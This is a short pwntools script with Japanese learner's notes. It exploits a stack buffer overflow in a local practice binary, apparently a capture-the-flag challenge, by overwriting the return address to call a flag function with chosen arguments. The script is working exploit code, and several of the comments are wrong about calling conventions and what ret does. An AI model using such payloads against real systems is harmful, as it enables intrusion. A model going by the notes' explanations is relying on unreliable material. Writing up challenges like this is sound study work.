from pwn import *

p = process('./vuln-32')

payload = b'A' * 52	        # これはバッファからリターンアドレスまでのオフセットで、実際52バイトだった
payload += p32(0x80491c7)	# 戻りアドレスの書き換え(flag関数のアドレス)
payload += p32(0x0)	        # これよくわからない
payload += p32(0xdeadc0de)	# 引数１つ目
payload += p32(0xc0ded00d)	# 引数２つ目

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())

# SOFの脆弱性、カナリア・PIE・ASLRオフ

# やりたいことは戻りアドレスを目的の関数へと書き換える
# その次に、目的の関数に必要な引数をセットするためスタックに引数の値を書き込む
# そしたらあとは正規のretが書き換えられた戻りアドレスを受け取り、目的の関数へと狙った引数を持ってジャンプし、攻撃が完了する

# x86(32bit)の場合
# cdecl : 右から左にかけて順にスタックへと積まれる 
# stdcall : cdeclに似ている(加えて?)、スタックのクリーンアップを呼び出し元が行う
#
# 引数を持つ関数が呼ばれると下記のようになるはず
# FUNCフレーム
# rbp
# retaddr
# 引数群
# MAINフレーム
#
# 引数に関しては
# +--------
# が
# +
# |
# | 
# |
# みたいに、時計回りに90度回転するようにスタックに収まると考えると良い
# 1 2 3
# なら
# 1
# 2
# 3
# とスタックに格納される(上が下位アドレス)

# retはpop rip(eip)と等価。rbp(ebp)が指す場所から8バイト(4バイト)をrbp(ebp)に設定する。
